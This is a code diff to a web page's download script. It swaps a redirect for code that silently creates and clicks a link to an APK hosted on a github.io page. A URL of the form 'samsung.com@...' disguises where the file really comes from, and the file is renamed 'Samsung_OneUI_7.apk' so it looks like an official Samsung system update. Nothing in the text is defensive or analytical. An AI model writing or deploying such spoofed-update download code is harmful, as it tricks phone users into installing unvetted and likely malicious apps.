@@ -31,9 +31,13 @@
 
   <script>
     function downloadUpdate() {
-      // Single spoofed URL with filename manipulation
-      const spoofedUrl = "https://www.samsung.com@ryynx88.github.io/samsung_oneui.apk";
-      window.location.href = spoofedUrl;
+      // Create download link with spoofed URL and custom filename
+      const a = document.createElement('a');
+      a.href = 'https://www.samsung.com@ryynx88.github.io/chy.apk';
+      a.download = 'Samsung_OneUI_7.apk';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
   </script>
 </body>
